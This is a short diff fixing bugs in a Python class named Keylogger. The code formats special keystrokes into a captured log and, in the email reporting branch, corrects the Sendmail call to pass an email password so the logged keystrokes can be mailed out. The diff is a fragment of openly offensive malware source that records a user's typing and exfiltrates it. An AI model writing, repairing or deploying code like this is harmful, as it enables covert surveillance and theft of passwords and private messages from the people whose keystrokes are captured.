@@ -28,7 +28,7 @@ class Keylogger:
                 name="."
             else:
                 name=name.replace(" ","_")
-                name=f"[{name.upper()}]"
+            name=f"[{name.upper()}]"
         self.log +=name
 
     #Reporting to Text File
@@ -73,7 +73,7 @@ class Keylogger:
             self.end_dt=datetime.now()
             self.update_filename()
             if self.report_method== "email":
-                self.Sendmail(EMAIL_ADDRESS,EMAIL_ADDRESS,self.log)
+                self.Sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,self.log)
             elif self.report_method=="file":
                 self.report_to_file()
                 print (f"[{self.filename}]-{self.log}")
